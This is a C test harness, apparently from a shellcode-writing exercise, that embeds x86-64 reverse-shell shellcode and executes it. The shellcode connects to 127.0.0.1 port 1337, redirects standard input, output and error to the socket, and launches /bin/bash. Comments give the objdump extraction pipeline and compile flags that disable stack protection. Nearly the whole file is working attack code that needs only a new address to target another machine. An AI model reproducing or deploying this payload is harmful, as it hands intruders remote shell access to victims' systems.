// get shell with:
//
// objdump -d asmtests/reverseshell | grep '[0-9a-f]:' | cut -f2 -d: | cut -f1-7 -d ' ' | head -n -3 | paste -d '' -s | sed 's/\t/ /g' | tr -s ' ' | sed 's/\ /\\x/g'
//
// compile with:
//
// gcc -fno-stack-protector -z execstack -o testshell testshell.c
//
int main(){
    // before removal of 0 bytes, see commit 8ea1a35 for change
    const char old_shellcode[142] = "\xbb\x02\x00\x00\x00\xb9\x01\x00\x00\x00\xba\x06"
    "\x00\x00\x00\xb8\x67\x01\x00\x00\xcd\x80\x49\x89\xc5\xb8\x00\x00\x00\x00\x50"
    "\x48\xb8\x02\x00\x05\x39\x7f\x00\x00\x01\x50\xb8\x2a\x00\x00\x00\x4c\x89\xef"
    "\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9"
    "\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9\x01\x00\x00\x00"
    "\xcd\x80\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9\x02\x00\x00\x00\xcd\x80\xb8\x68"
    "\x00\x00\x00\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50\xb8\x3b\x00\x00"
    "\x00\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05";

    const char shellcode[112] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
    "\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x49\x89\xc5\x48\xb8\x02\x00"
    "\x05\x39\x7f\x00\x00\x01\x50\x48\x31\xc0\xb0\x2a\x4c\x89\xef\x48\x89\xe6\xb2"
    "\x10\x0f\x05\xb0\x3f\x4c\x89\xeb\x48\x31\xc9\xcd\x80\xb0\x3f\x4c\x89\xeb\xb1"
    "\x01\xcd\x80\xb0\x3f\x4c\x89\xeb\xb1\x02\xcd\x80\xb0\x68\x66\x50\x48\xb8\x2f"
    "\x62\x69\x6e\x2f\x62\x61\x73\x50\x48\x31\xc0\xb0\x3b\x48\x89\xe7\x48\x31\xf6"
    "\x48\x31\xd2\x0f\x05";

    int (*ret)() = (int(*)())shellcode; ret();

    return 0;
}